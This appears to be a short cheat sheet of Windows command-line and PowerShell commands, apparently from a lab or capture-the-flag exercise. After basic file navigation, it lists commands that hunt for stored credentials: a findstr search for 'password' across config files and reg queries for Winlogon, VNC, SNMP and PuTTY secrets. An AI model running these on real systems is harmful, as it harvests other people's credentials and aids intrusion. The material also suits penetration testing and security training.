ls
type example.txt
$items = Get-ChildItem
cd $items[4].FullName
cat *.txt
cd *
cat 1*
tree /F
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.gif *.ps1 *.yml
reg query "HKLM /f password /t REG_SZ /s"
reg query "HKCU /f password /t REG_SZ /s"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
reg query "HKCU\SOFTWARE\1337Haxxor\PuTTY\Sessions"
